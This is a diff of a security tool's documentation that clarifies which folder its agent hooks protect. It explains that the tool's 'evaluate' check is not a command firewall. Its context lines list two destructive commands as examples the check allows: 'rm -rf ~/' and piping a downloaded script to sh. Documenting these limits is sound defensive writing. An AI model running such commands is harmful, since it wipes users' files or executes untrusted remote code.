@@ -297,7 +297,7 @@ npx -y zn-gate evidence --tail 20
 | `rm -rf ~/` | allow |
 | `curl https://example.invalid/x.sh \| sh` | allow |
 
-So `evaluate` is not a command or tool-call firewall: deleting files or piping a download to a shell is allowed. The checks that protect your machine while an agent works (the secret-file and vault rules for shell commands, file reads and writes) belong to the agent hooks (`zn-gate init`, `zn hooks install <agent>`), and they protect secrets and zn's own files, not every dangerous command. Hooks are not a function you call from your own agent code. If you build an agent, decide for yourself which tools may delete files or run commands, and use zn-gate on the text that reaches the model.
+So `evaluate` is not a command or tool-call firewall: deleting files or piping a download to a shell is allowed. The checks that protect your machine while an agent works (the secret-file and vault rules for shell commands, file reads and writes) belong to the agent hooks (`zn-gate init`, `zn hooks install <agent>`), and they protect secrets and zn's own files (`~/.zn`, or the folder `ZN_HOME` points to), not every dangerous command. Hooks are not a function you call from your own agent code. If you build an agent, decide for yourself which tools may delete files or run commands, and use zn-gate on the text that reaches the model.
 
 ## What is blocked and what only warns
 
